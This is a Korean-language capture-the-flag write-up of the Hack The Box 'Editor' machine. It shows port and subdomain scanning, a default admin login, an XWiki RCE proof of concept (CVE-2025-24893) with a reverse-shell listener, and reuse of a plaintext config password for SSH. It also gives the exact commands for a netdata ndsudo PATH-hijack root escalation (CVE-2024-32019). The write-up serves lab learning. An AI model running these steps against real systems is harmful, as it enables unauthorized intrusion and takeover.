# HTB-EDITOR
```bash
OS: Linux
DATE:26.10.07
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 접근을 위해 전체 포트 검사 및 상세 포트 검사를 진행하였다. 또한 UDP 포트 검사도 진행했다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80,8080 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
초기 검사 결과 22(ssh), 80(http), 8080(Jetty, http) 이렇게 서비스가 운영 중이었다. 따라서 80 포트 서비스 먼저 FUZZING을 진행하였다
```bash
ffuf -u http://editor.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -u http://editor.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r 
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://editor.htb -H "Host: FUZZ.editor.htb"
```
FUZZING 결과 평범한 웹사이트라는 것을 알게 되었고, 서브도메인 wiki가 나왔지만 302 코드로 접근이 불가하였다

## Initial Access
80 포트 열거를 진행한 후 8080 서비스에 접속한 결과 `XWIKI`라는 서비스가 운영 중인 걸 알게 되었다. 또한 로그인창에서 `admin:admin`으로 접속 시도한 결과 접속이 가능하였다. 따라서 XWIKI 버전 15.10.8이라는 것도 알게 되어 버전 취약점을 찾아본 결과 `CVE-2025-24893`라는 RCE 취약점을 발견할 수 있었다. 따라서 [PoC](https://github.com/investigato/cve-2025-24893-poc/tree/main)를 사용하여 초기 **xwiki** 쉘을 딸 수 있었다
```bash
./target/release/cve-2025-24893-gato --url http://editor.htb:8080 --ip IP --port 4444
```
```bash
rlwrap nc -nlvp 4444

$
```
초기 쉘을 얻은 결과 굉장히 권한이 낮은 쉘이라 유저로 업그레이드가 필요하였다. 따라서 `/var/lib/xwiki`를 뒤져본 결과 계속해서 아무런 정보를 찾지 못하였다. 하지만 /etc 설정 파일에서 `/etc/xwiki/hibernate.cfg.xml` 안의 DB 평문 비밀번호를 얻게 되었다. 이 비밀번호로 oliver라는 유저의 ssh 접속을 시도한 결과 oliver 쉘을 얻을 수 있게 되었다

![user](attach_real/Pasted%20image%2020261010165115.png)

## Privilege Escalation
유저 쉘을 얻은 후 SUID를 확인해보았다
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
확인 결과 `/opt/netdata/`로 시작하는 파일들이 많이 있었다. 따라서 이후 netdata라는 프로그램 버전을 확인한 결과 `CVE-2024-32019`라는 취약점이 있다는 것을 알게 되었다. 따라서 디렉토리에 들어가서 PoC를 사용하여 루트 쉘을 얻게 되었다
```bash
cd /tmp
```
```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > nvme
chmod +x nvme
```
```bash
PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
```bash
/bin/bash -p
```

![root](attach_real/Pasted%20image%2020261010165059.png)

## New Inform
- /etc: 설정 DB 접속 정보, 포트 등 전부 여기 있음. 프로그램이 돌면서 스스로 바꾸는 게 아니라 관리자가 편집하거나 패키지 설치 시 배치되고 그 뒤로는 거의 안 변하는 파일들
- /var: 변하는 데이터. 프로그램이 실행 중에 내용이 계속 바뀌는 파일들, 로그, 캐시, 스풀, DB 파일 등등
- 쉘 열거를 할 때 /etc 설정 파일을 꼭 뒤져보자
- cfg: 설정 파일